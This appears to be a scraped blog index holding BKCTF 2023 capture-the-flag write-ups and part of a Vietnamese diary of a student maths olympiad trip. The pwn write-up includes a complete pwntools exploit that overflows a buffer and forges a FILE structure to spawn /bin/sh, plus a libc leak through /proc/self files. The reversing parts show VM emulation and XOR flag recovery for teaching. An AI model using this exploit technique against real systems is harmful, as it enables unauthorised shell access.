is the dream of many students across the country. I remember BKSEC because I know some very skilled peoples such as chung96vn, lanleft, and hacmao. ","date":"2023-08-19","objectID":"/2023-bkctf/:0:0","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"rev/BabyStack (Hard) Challenge Information Given files: BabyStack.zip (password: cookiehanhoan) Difficulty: Hard Description: Stack up to the moon. Flag format: BKSEC{} ","date":"2023-08-19","objectID":"/2023-bkctf/:1:0","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x00 My opinion In my opinion, this challenge is not very hard. If you have a bit of experience with StackVM-style problems, you will find it quite easy. I will try to explain every small step so beginners can follow along. Happy hacking… ","date":"2023-08-19","objectID":"/2023-bkctf/:1:1","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x01 Overview \u0026 Clean code The challenge gives us a 64-bit PE file named StackVM.exe with more than 300 lines of pseudocode, mostly variable declarations and assignments. At a glance, we can see the program initializes a series of bytecode for the VM like this: Next, the program reads your input into Buffer and checks whether its length is exactly 20. fgets(Buffer, 0x15, v6); do { Buffer[++v4]; } while ( Buffer[v4] ); if ( v4 != 0x14 ) { v7 = sub_140001000(std::cout, \"Not enough length\"); std::ostream::operator\u003c\u003c(v7, sub_140001260); exit(0); } We should redefine the sizes of the bytecodes[] and Buffer[] arrays to make the code cleaner. Set Buffer[] to 20 bytes and rename it to input[]. and set the bytecodes[] array to 400 bytes. Why did I calculate the size as 400 bytes? Because bytecodes starts at v24 [rsp+60h] and ends at v131 [rsp+1E8h]. So, 0x1E8 - 0x60 + 8 = 400. Okay, the program is a bit shorter now. Looking at the code below, we can see it uses a vtable. It is a table of functions when the program needs a function, it jumps to the corresponding entry in that table and calls it. I will create a struct for the vtable with a size of 40 bytes, which matches the size of v19. Double-click vtable, select all the functions, right-click, and choose Create struct …, name it struct_vtable. I’ll keep the field names as they are for now and rename them later when the analysis is more detailed. In StackVM challenges, almost everything happens on a single stack. Two things are essential: stack_base: the base address of the stack stack_esp: the top-of-stack pointer From the pseudocode, I’m quite sure v19[4] is stack_base and v19[3] is stack_esp, v19[1] and v19[2] are still unclear, so I won’t define them yet. Next, create a struct_vm struct like this: And cast the first field as a *struct_vtable (the one we defined above). Right-click v19, choose Convert to Struct …, and select struct_vm to apply the new structure to v19. ","date":"2023-08-19","objectID":"/2023-bkctf/:1:2","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x02 VM Analysis We can see that the input is loaded into the bytecodes[] array as follows: bytecodes[29] = input[0]; bytecodes[28] = input[1]; bytecodes[79] = input[2]; bytecodes[78] = input[3]; bytecodes[117] = input[4]; bytecodes[116] = input[5]; bytecodes[155] = input[6]; bytecodes[154] = input[7]; bytecodes[193] = input[8]; bytecodes[192] = input[9]; bytecodes[231] = input[10]; bytecodes[230] = input[11]; bytecodes[269] = input[12]; bytecodes[268] = input[13]; bytecodes[307] = input[14]; bytecodes[306] = input[15]; bytecodes[345] = input[16]; bytecodes[344] = input[17]; bytecodes[383] = input[18]; bytecodes[382] = input[19]; If you look closely, the bytecodes that hold the input appear in adjacent pairs. So it’s very likely the program processes the input two bytes at a time. The main processing routine is here: do { v10 = bytecodes[idx]; if ( bytecodes[idx + 1] == 6 ) { instruction_sz = 4i64; HIDWORD(ptr_vm) = bytecodes[idx + 1]; LOBYTE(ptr_vm) = bytecodes[idx]; v12 = ptr_vm; LOWORD(v20) = bytecodes[idx + 3] + (bytecodes[idx + 2] \u003c\u003c 8); v13 = v20; } else { HIDWORD(v21) = bytecodes[idx + 1]; instruction_sz = 2i64; LOBYTE(v21) = bytecodes[idx]; v12 = v21; LOWORD(v22) = 0; v13 = v22; } *(_DWORD *)\u0026input[8] = v13; vtable = v3-\u003evtable; total_bytecode += instruction_sz; *(_QWORD *)input = v12; ((void (__fastcall *)(struct_vm *, char *))vtable-\u003e___7stackVM__6B@)(v3, input); idx += instruction_sz; } while ( total_bytecode \u003c 0x18C ); Summary of the code above: If [idx + 1] == 6: The instruction is 4 bytes long, from [idx] to [idx + 3]. The value is the combination of [idx + 2] and [idx + 3]. It’s handled by the PUSH function. If [idx + 1] != 6: The instruction is 2 bytes long, from [idx] to [idx + 1]. Based on [idx + 1], there are 8 different handler functions to call. CMP = 0 XOR = 1 ADD = 2 SUB = 3 SHL = 4 SHR = 5 POP = 7 AND = 8 Below is an example of how I renamed and re-typed the PUSH function. __int64 __fastcall PUSH(struct_vm *a1, char a2, __int16 value) { __int64 result; // rax __int64 stack_esp; // r9 result = a1-\u003estack_base; stack_esp = a1-\u003estack_esp; if ( a2 == 1 ) { *(result + stack_esp + 1) = value; a1-\u003estack_esp += 2i64; } else { *(result + stack_esp + 1) = value; ++a1-\u003estack_esp; } return result; } ","date":"2023-08-19","objectID":"/2023-bkctf/:1:3","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x03 VM Emulator After understanding how it works, I extracted all the values from the bytecodes[] array and wrote a small Python script to see what operations the program performs. bytecodes = [0x00, 0x06, 0x00, 0x01, 0x01, 0x06, 0x0C, 0x0D, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x22, 0x38, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x62, 0x61, 0x01, 0x01, 0x01, 0x06, 0x69, 0x4E, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x0C, 0x0D, 0x01, 0x06, 0x2D, 0x41, 0x01, 0x02, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x22, 0x38, 0x01, 0x06, 0x55, 0x22, 0x01, 0x01, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x64, 0x63, 0x01, 0x01, 0x01, 0x06, 0x32, 0x6A, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x49, 0x30, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x3E, 0x5E, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x66, 0x65, 0x01, 0x01, 0x01, 0x06, 0x45, 0x0A, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x3B, 0x20, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x6B, 0x2D, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x68, 0x67, 0x01, 0x01, 0x01, 0x06, 0x5B, 0x78, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x2B, 0x79, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x70, 0x41, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x6B, 0x69, 0x01, 0x01, 0x01, 0x06, 0x37, 0x45, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x78, 0x79, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x34, 0x41, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x6D, 0x6C, 0x01, 0x01, 0x01, 0x06, 0x55, 0x0A, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x6A, 0x36, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x2D, 0x01, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x32, 0x31, 0x01, 0x01, 0x01, 0x06, 0x58, 0x1E, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x75, 0x1B, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x3B, 0x17, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x34, 0x33, 0x01, 0x01, 0x01, 0x06, 0x0F, 0x19, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x77, 0x7C, 0x01, 0x06, 0x00, 0x08, 0x01, 0x05, 0x01, 0x06, 0x45, 0x30, 0x01, 0x06, 0xFF, 0x00, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x36, 0x35, 0x01, 0x01, 0x01, 0x06, 0x76, 0x03, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x01, 0x06, 0x0F, 0x37, 0x01, 0x06, 0x00, 0x08, 0x01, 0x04, 0x01, 0x06, 0x3B, 0x23, 0x01, 0x06, 0x00, 0xFF, 0x01, 0x08, 0x01, 0x02, 0x01, 0x06, 0x38, 0x37, 0x01, 0x01, 0x01, 0x06, 0x4A, 0x12, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00] idx = 0 while (idx \u003c len(bytecodes)): code = bytecodes[idx + 1] if (code == 0x06): instruction_sz = 4 value = (bytecodes[idx + 2] \u003c\u003c 8) | (bytecodes[idx + 3]) print(f\"PUSH {hex(value)}\") idx += 4 else: instruction_sz = 2 match code: case 0x00: print(\"CMP\") case 0x01: print(\"XOR\") case 0x02: print(\"ADD\") case 0x03: print(\"SUB\") case 0x04: print(\"SHL\") case 0x05: print(\"SHR\") case 0x07: print(\"POP\") case 0x08: print(\"AND\") idx += 2 I’ll start by analyzing a small part of the first results using the input abcdefghiklm12345678. PUSH 0x1 PUSH 0xC0D PUSH 0x8 SHR PUSH 0x2238 PUSH 0xFF00 AND ADD PUSH 0x6261 XOR PUSH 0x694E CMP PUSH 3 numbers 0x1, 0xC0D, 0x8 onto the stack. ESP will point to the value 0x8. SHR is shift-right top 2 values on the stack: 0xC0D » 0x8 = 0xC. ESP becomes 0xC. PUSH 2 numbers 0x2238 and 0xFF00, then do AND. Result: 0x2238 \u0026 0xFF00 = 0x2200. ADD the top two values on the stack: 0x2200 + 0xC = 0x220C. PUSH 0x6261, which is the first 2 bytes of the input. XOR the values: 0x220C ^ 0x6261 = 0x406D. CMP that result with 0x694E. The above is just my guess. To verify it, I’ll debug and check at the CMP function to see if the logic is actually correct. The result is completely correct. Since we’ve dumped all the instructions, we could solve the flag by hand. But to save time, I’ll set breakpoints at the XOR and CMP functions to capture the final results. value = [0x220c, 0x7739, 0x3e49, 0x6b3b, 0x7","date":"2023-08-19","objectID":"/2023-bkctf/:1:4","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"rev/Reality (Medium) Challenge Information Given files: reality.zip (password: cookiehanhoan) Difficulty: Medium Description: A simple reversing challenge… Flag format: BKSEC{} The challenge gives us a PE32 file named reality.exe. When I decompile it, IDA doesn’t show any pseudocode. I’ll read the assembly and debug it to understand what the program is doing. Overall, the program reads the input and, when we debug it, it always jumps into the exception handler block. In the neighboring block, I see a suspicious string: BKSEECCCC!!!. Checking the function sub_401220() called there, it’s just XORing the input with that string as the key. char __fastcall sub_401220(const char *a1, int a2, int a3) { char result; // al signed int v5; // esi int i; // ecx v5 = strlen(a1); for ( i = 0; i \u003c a3; ++i ) { result = a1[i % v5]; *(_BYTE *)(i + a2) ^= result; } return result; } I debugged the program and changed EIP to point to this block. Below it, there are lots of bytecodes. After using Make Code (in IDA) to disassemble them, I can see they perform very complex transformations. At loc_40131F, there is the instruction jmp short near ptr loc_40131F+1 This means it would loop forever at this point. I realized something was wrong, so I pressed d to split everything into individual bytecodes, then pressed c to make code again. The result is as follows. Yeah, now it’s clear. The program checks if we are debugging. If yes, it jumps into that complex calculation block; otherwise, it jumps to loc_401AD5. Why do I know this is anti-debugging? You can see the answer in the reference below. stackoverflow. At loc_401AD5, the code only assigns values to cipher[]. So we just need to take this array and XOR it with the key above to recover the flag. cipher = [ 0x00, 0x00, 0x00, 0x00, 0x06, 0x38, 0x26, 0x77, 0x30, 0x58, 0x7E, 0x42, 0x2A, 0x7F, 0x3F, 0x29, 0x1A, 0x21, 0x36, 0x37, 0x1C, 0x55, 0x49, 0x12, 0x30, 0x78, 0x0C, 0x28, 0x30, 0x30, 0x37, 0x1C, 0x21, 0x12, 0x7E, 0x52, 0x2D, 0x26, 0x60, 0x1A, 0x24, 0x2D, 0x37, 0x72, 0x1C, 0x45, 0x44, 0x43, 0x37, 0x2C, 0x6C, 0x7A, 0x38 ] key = [ord(i) for i in \"BKSEECCCC!!!\"] flag = \"\".join([chr(cipher[i] ^ key[i % len(key)]) for i in range(len(cipher))]) print(flag) FLAG: BKSEC{e4sy_ch4ll_but_th3r3_must_b3_som3_ant1_debug??} Challenge Information Given files: checker.zip Difficulty: Easy Description: a checker ran with rice tree. Flag format: BKSEC{} **Solution** Updating ... -- ","date":"2023-08-19","objectID":"/2023-bkctf/:2:0","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"pwn/File Scanner (Medium) Challenge Information Given files: bkctf2023-file-scanner.zip (password: cookiehanhoan) Difficulty: Medium Description: The most powerful tool maybe the worst :(. Flag format: BKSEC{} ","date":"2023-08-19","objectID":"/2023-bkctf/:3:0","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x01 Finding the bug Note You might get a “permission denied” error even after chmod +x ./file_scanner. I fixed it by creating a symlink with the correct, expected name so the loader can find it. ln -sf ld-2.23.so ld-linux.so.2 ln -sf libc_32.so.6 libc.so.6 The program generates a 16-byte random value and requires us to enter that exact value. v3 = time(0); srand(v3); for ( i = 0; i \u003c= 15; ++i ) s2[i] = generateRandomHexValue(); memset(s, 0, sizeof(s)); printf(\"Are you Huster? Show me your ID: \"); custom_read(s); n = strlen(s); if ( strncmp(s, s2, n) ) { printf(\"Do you forgot your ID, so badd !!!\"); exit(1); } puts(\"Ohh... so you can use the newest tool I just found\"); puts(\"Please don't break my program T_T\\n\"); We can fully bypass the strncmp function by using the input \\n. It’s clear the author intends us to use a File Structure Attack. In option 4, the program has a buffer overflow (BOF) bug as follows: puts(\"oh... I forgot asking your name\"); printf(\"What is your name: \"); __isoc99_scanf(\"%s\", name); printf(\"See you soon, %s !!!\\n\", name); if ( filePtr ) fclose(filePtr); exit(1); ","date":"2023-08-19","objectID":"/2023-bkctf/:3:1","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x02 Exploiting BOF bug From the name variable, we can fully overwrite both filePtr and fileContent. My idea is to create a fake file structure, then overwrite filePtr so it points to this fake file. Every function in the vtable is system() from libc, and fakeFile.flags points to the string /bin/sh\\x00. When we call fclose(filePtr), it will actually call system(\"/bin/sh\"). To leak the libc base, we can open /proc/self/maps or /proc/self/syscall. ","date":"2023-08-19","objectID":"/2023-bkctf/:3:2","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"0x03 Final script #!/usr/bin/env python3 from pwn import * import time exe = ELF(\"./file_scanner_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.23.so\") p = process(exe.path) p = remote('103.97.125.56', 31480) context.update(arch='i386', os='linux', log_level='debug', terminal='cmd.exe /c start wsl'.split(), binary=exe) def GDB(): gdb.attach(p, gdbscript=''' b *0x8048C9A continue ''') pause() # GDB() def open_file(fileName): p.sendlineafter(b'choice :', b'1') p.sendlineafter(b'filename: ', fileName.encode()) def read_file(): p.sendlineafter(b'choice :', b'2') def write_file(): p.sendlineafter(b'choice :', b'3') def close_file(): p.sendlineafter(b'choice :', b'4') p.sendlineafter(b'ID: ', b'') open_file('/proc/self/syscall') read_file() write_file() libc_leak = int(p.recvline()[:-1].split()[-1].decode(), 16) libc.address = libc_leak - 0x1ba549 log.info(f'libc.address: {hex(libc.address)}') # creat fake file structure file = FileStructure() file.flags = b'/bin' file._IO_read_ptr = b'/sh\\x00' file._lock = exe.symbols['fileContent'] + 400 file.vtable = exe.symbols['fileContent'] + 152 log.info(f'fake file length: {len(bytes(file))}') payload = b'A' * 32 + p32(0x804b0e0) + p32(0) * 7 + bytes(file) + p32(libc.symbols['system']) * 18 close_file() p.sendlineafter(b'name: ', payload) p.interactive() FLAG: BKSEC{fSoP_1s_n0t_2_hArd_4_u_1fac8554f8eb55a103be3e34c9cf6940} ","date":"2023-08-19","objectID":"/2023-bkctf/:3:3","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":"Hành trình đáng nhớ của tôi ở kỳ thi Olympic Toán Sinh viên Toàn quốc năm 2023. img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin: 15px auto; } Tôi là sinh viên năm nhất của Đại học Thủy Lợi tham gia kỳ thi Olympic Toán học năm 2023 tại thành phố Huế đầy thơ mộng. Đoàn Hà Nội chúng tôi gồm 10 thành viên, chia đều thành 2 nhóm: Đại Số và Giải Tích cùng với 2 thầy cô dẫn đoàn là thầy Thọ và cô Lý. Đoàn chúng tôi vào Huế bằng máy bay hãng Vietjet. Ở sân bay chúng tôi bắt gặp đoàn ĐHSP Hà Nội và đoàn Đại học KTQD. Đây cũng là lần đầu tiên tôi được đi máy bay, cảm giác khá hồi hộp và hào hứng. Thật tiếc là sau chuyến bay đó tôi không muốn phải đi thêm máy bay lần nào nữa 😢 Vietjet xin tài trợ bức ảnh này ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:0:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ nhất (03 - 04 - 2023) Chúng tôi vào Huế lúc 13h chiều, thời tiết ở đây nắng kinh khủng. Đã rất lâu rồi tôi mới được cảm nhận cái nắng miền Trung như thiêu như đốt. Tất cả chúng tôi ai nấy đều mệt mỏi rã rời. May mà có một ông Tây để cho chúng tôi bắt chuyện, lúc đó cả đội mới đỡ mệt hơn. Bọn tôi đi taxi về khách sạn Duy Tân, phòng của 3 anh em đội Đại số là 116, Giải tích là 117, chị Thơm và chị Lan Anh thì ở 213. Lúc chúng tôi lên nhận phòng thì thấy đoàn Đại học Kiến Trúc đang thi nhau làm kỷ yếu. Chúng tôi có chơi và trêu họ một chút rồi vào phòng. Một lúc sau, cả đoàn được 2 thầy cô dẫn đi ăn cơm niêu. Lần đầu tôi được ăn món thịt luộc chấm tôm chua. Tôi thấy không hợp khẩu vị của mình cho lắm, mắm tôm vẫn là chân ái của đời tôi. Ăn uống xong xuôi thì cả đoàn đi bộ về. Thầy buổi chiều hình như phải đi họp, còn bọn tôi thì thi nhau trùm chăn ngủ không biết trời đất gì. Khoảng chập tối, thầy đi gõ cửa từng phòng để gọi bọn tôi đi ăn tối. Chắc thầy nghĩ chúng tôi đang ôn bài say sưa nhưng thực ra thì không, bọn tôi ai nấy rủ nhau ngủ. Bọn em xin lỗi nhưng bọn em quá mệt rồi 😪. Chiều hôm đó cả đội ăn cơm ở khách sạn, buổi tối tầm 9 - 10h đêm thì đoàn Đại học Thủy Lợi phân hiệu đến. Đêm đó 3 anh em chúng tôi là anh Nam, anh Kiên và tôi mang sách ra ôn để chiều ngày mai thi. Tôi ngồi xem lại tất cả các bài tôi đã giải, cũng không muốn học thêm gì nữa vì lúc đó khá muộn rồi. Tôi cất sách vở và đi ngủ trước, 2 anh vẫn ngồi ôn bài, một lúc sau thì đành lên ngủ với đứa em này. Đêm đó tôi trằn trọc khó ngủ, chắc có lẽ vì lạ giường và tôi đã phải di chuyển một quãng đường xa nên hơi mệt mỏi. ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:1:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ hai (04 - 04 - 2023) Sáng thứ 3, cả đoàn chúng tôi đi ra ĐHSP Huế để tham dự buổi khai mạc và checkin. Trường ĐHSP Huế khá rộng, được xây dựng theo kiến trúc hình cánh quạt. Bên cạnh trường là sông Hương thơ mộng và cầu Tràng Tiền. Hội trường của trường đều được làm bằng gỗ. Buỗi khai mạc đang diễn ra suôn sẻ thì bị mất điện, một số đoàn đã đi về trước. Một lát sau khi có điện trở lại, các đoàn lại lên thay nhau chụp ảnh. Hai đội checkin ở hội trường trường ĐHSP Huế\" Hai đội checkin ở hội trường trường ĐHSP Huế Chiều thứ 3, 5 người đội Đại Số chúng tôi gồm: chị Thơm, chị Lan Anh, anh Nam, anh Kiên và tôi cùng 3 anh ở phân hiệu là anh Huy, anh Thành và anh Nguyên thi môn Đại Số. Tôi bước vào phòng thi với tâm lý không phải chịu áp lực nào nhưng cũng không tự tin cho lắm. Vì đã từ rất lâu rồi, tôi mới lại tham dự một kỳ thi học sinh giỏi. Một số kỹ năng giải bài hay thi cử của tôi chưa được phát huy tối đa. Trước giờ vào phòng thi, tôi có làm quen 2 bạn bên Đại học Thăng Long. Tầm đúng 14h, chúng tôi bắt đầu làm bài thi của mình. Khi nhận được đề bài, tôi chú ý đầu tiên là bài số 2, đây là dạng bài ánh xạ tuyến tính. Tôi nghĩ thầm trong đầu, thôi cả đoàn toang rồi. Vì cả đoàn không một ai ôn phần này, bọn tôi nghĩ nếu ra phần này sẽ ra dạng bài rất khó, rất trừu tượng. Bản thân tôi không có thời gian để làm phần này nhiều nên tôi phải bỏ phần này. Câu 1A thì ai cũng làm được nhưng đến câu 1B, tôi lại rất chật vật để giải quyết bài này. Tôi vật lộn với câu hỏi này hơn 30 phút, thử mọi cách để tìm nghiệm của phương trình bậc 3. Chúng tôi không được dùng máy tính nên việc tìm nghiệm của phương trình: $3.2022.2023.x - (x^3 + 2022^3 + 2023^3) = 0$ là không hề dễ dàng. Tôi thấy hàng loạt các bạn ngồi ở trên bỏ trống câu 1B này, trong đầu tôi cũng có suy nghĩ câu này rất khó. Sai lầm của tôi là không thoát ra ý tưởng đang làm để làm ý tưởng mới. Đây là một kĩ năng mà ai đi thi cũng cần phải có. Thật buồn khi tôi đã từng tự tin đến mức các bài tính định thức, hạng ma trận tôi có thể làm được lên tới 90%, tôi đã học rất nhiều những dạng này. Mà vào thi một bài rất đơn giản lại không làm được😢 Ngồi cùng hàng với tôi có 1 bạn bên Học viện BCVT, trông rất sáng sủa và đẹp trai. Khi được phát đề, tầm 5 phút mà bạn đó làm gần hết tờ giấy thi, trong khi tôi đang chật vật xử lý câu 1B. Lúc đó tôi buồn bã vô cùng, cảm giác như bị bất lực trước bài được cho là dễ nhất đề. Tôi chuyển hướng sang làm bài 3A. Thật kinh khủng khi tôi không thể hình dung ra được bài 3A muốn hỏi cái gì. Đây là lần đầu tiên tôi học đề mà không hình dung được đề. Bài này cũng gây tranh cãi khá nhiều giữa các thầy cô vì đề rất khó hiểu. Tiếp đến tôi thấy đề câu 4A hỏi về chéo hóa ma trận, tôi nghĩ thầm là bài này dễ, có điểm rồi. Khi tôi nháp bài này, không hiểu sao cả 2 lần tôi đều nháp ra có vector riêng là $(0, 0)$. Lúc đó tôi mới nghĩ là đề cố tình lừa, ma trận không chéo hóa được. Khi tôi trình bày vào giấy thì lại ra kết quả khác và nó đúng. Tôi cẩn thận kiểm tra lại lần nữa thì mới chắc chắn rằng bài này mình làm đúng. Xong 4A, tôi có nhìn qua 3B. Ý tưởng ban đầu của tôi là giả sử có 2 vector khác nhau thỏa mãn đề bài, rồi chỉ ra 2 vector đó giống nhau. Cuối cùng tôi vẫn chưa giải quyết được bài đó. Tôi chuyển sang đọc đề câu 5. Lại là ma trận 0 - 1, mấy bài dạng này có ở trong Kỷ yếu 2022, nhưng tôi lại bỏ vì đáp án quá khó hiểu. Tôi không làm được câu 5, sau đó tôi làm câu 2A1 nhưng làm theo kiểu khá vớ vẩn, không chuẩn như khi học. Bỗng tôi có hướng làm khác cho bài 3B, tôi gộp các nhân tử chung lại và đi chứng minh $det(I_2 - A) \\neq 0$, thật may mắn là tôi đã giải quyết được bài này khá dễ dàng. Đang lên phong độ, tôi quay về giải quyết bằng được câu 1B, nhưng thực sự vô vọng, tôi thử biết bao cách mà vẫn chưa ra được kết quả. Thậm chí tôi bị áp lực đến nỗi quên hằng đẳng thức $(x-y)^3$, phải chọn $x = 5, y = 2$ để xác định dấu các phần tử. Còn 10 phút nữa là kết thúc, tôi nộp bài để khỏi phải chờ đợi. Tôi ra trước và đợi kết quả từ anh Kiên và anh Nam.","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:2:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ ba (05 - 04 - 2023) Sáng thứ 4, đội giải tích bắt đầu làm bài thi. Đội giải tích gồm anh Kiên, anh Phong, anh Phương, anh Hạnh và anh Minh. Đội Đại số của chúng tôi và phân hiệu cùng cô Loan rủ nhau đi ăn chè hẻm. Bọn tôi sang quán thì họ bảo là 10h mới mở cửa, thế là cô rủ cả đội đi The Coffee House. Cô Loan mời cả đội uống The Coffee House Hơn 10h trưa, trời nóng khá gay gắt, cả đội chúng tôi đến trường để đón đội giải tích. Tôi có gặp một bạn ở Vĩnh Phúc, hỏi qua thì bạn có bảo đề năm nay khá dễ thở. Bạn làm được 4/5 bài, lúc đó tôi nghĩ hơi tiêu cực 1 chút. Nếu đề quá dễ thì điểm sàn sẽ rất cao, nếu trình bày không cẩn thận sẽ rất dễ mất điểm. Tầm 11h, đội giải tích ra thì ai cũng bảo làm được chắc chắn 2 bài. Tôi và cả đội nghĩ bên giải tích điểm sẽ cao. Lúc đi về thì tôi biết được là có Ngô Quý Đăng - Vàng IMO 2020, 2022 có tham dự kỳ thi này. Tôi cũng được gặp Phạm Hoàng Sơn - Bạc IMO 2022 và thầy Lê Phúc Lữ. Sau buổi ăn cơm thì đội đại số chúng tôi có rủ thêm anh Huy, anh Trường bên phân hiệu về đánh bài uống nước. Cảm ơn anh Trường và anh Huy vì những pha cứu bài 1 điểm khó tin của em 😁 Sau đó thì tôi chạy sang phòng anh Huy chơi bài Poker búng tai tiếp. Dự định buổi chiều của mấy anh em là đi đá bóng sân nhân tạo. Tiếc là chúng tôi không thuê được sân nên rủ nhau đi Quốc học Huế. Tôi, anh Kiên và chị Lan Anh đi trước, đợi mãi mới thấy cô và các anh chị đến. Lúc đó cũng tầm 5h chiều. Tôi có ghé qua một số lớp của trường Quốc học như 12 Toán, 12 Tin. Trường khá rộng, màu sơn khá giống với trường đại học của chúng tôi. Nhắc đến Quốc học Huế thì tôi có nhớ đến anh Nguyễn Hy Hoài Lâm - Đồng IOI 2017. Tôi biết anh Lâm khi theo dõi các bài viết của Cyber Jutsu. Đội Đại số ở trường Chuyên Quốc học Huế Tối đó bọn tôi được thầy cô dẫn đi bánh xèo Huế. Nhân các loại bánh thường là tôm, tôi ăn thấy khá ngon. Ăn uống xong, mọi người đi bộ ở Sông Hương. Tôi và anh Kiên đến sau vì anh Kiên phải đi với tôi lấy điện thoại bị quên. Anh Kiên mua cho tôi 1 bịch sữa chua để uống. Em cảm ơn anh Kiên rất nhiều. Thầy cô định dẫn chúng tôi đi thăm quan trường chuyên Quốc học Huế nhưng chúng tôi đã đi từ lúc chiều nên xin thầy cô được về trước. Trên đường đi, tôi có nói chuyện với anh Tân, một người anh có xuất phát điểm khá giống tôi. Tôi quen được thêm cả anh Sơn nữa, cả 2 anh đều ở Buôn Mê Thuột. Xong xuôi thì cả đội về phòng ngủ, tầm hơn 23h gì đấy, thầy có gõ cửa phòng, đưa cho chúng tôi đáp án và tự chấm. Lúc này anh Kiên mới thấy cách mình làm không giống như đáp án bài 3A. Câu 1B hình như anh không làm được và 5A cũng bị sai nốt, anh Nam đúng hoàn chỉnh câu 1, sai câu chéo hóa 4A. Tôi thì không xem đáp án và không quan tâm lắm. Tôi không đủ tự tin mình có giải nên không có xem. Đêm đó là một đêm rất buồn với 2 anh, tôi thì đỡ hơn một chút vì tôi không áp lực bằng anh Nam và anh Kiên. ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:3:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ tư (06 - 04 - 2023) Sáng thứ 5, các thầy cô đi họp. Anh Kiên thi cuối kỳ môn gì đấy, nghe bảo thầy khó tính lắm. Tôi và anh Kiên troll mọi người là thầy báo điểm rồì. Chị Thơm 16, chị Lan Anh 6.5, anh Nam 13, anh Kiên 6.5 và tôi 4.5. Chị Thơm khá là tỉnh táo, nhắn tin hỏi thầy xem có điểm chưa 🙏 Chị Lan Anh với anh Nam thì rất tin tưởng 2 đứa em này, nhưng không nghĩ là mình bị điểm thấp thế, chuẩn bị làm đơn phúc khảo bài. Anh Nam 13 điểm thì cảm thấy khá ổn. Buổi chiều thì chúng tôi được đi chơi ở Kinh thành Huế. Ở cổng đầu tiên, có 4 khẩu pháo thần công. Hình ảnh chỉ mang tính chất minh họa, chứ không dùng để đánh nhau. Kinh thành Huế khá rộng, cô Lý thuê cho đoàn một cô hướng dẫn viên. Chúng tôi được nghe nhiều về các 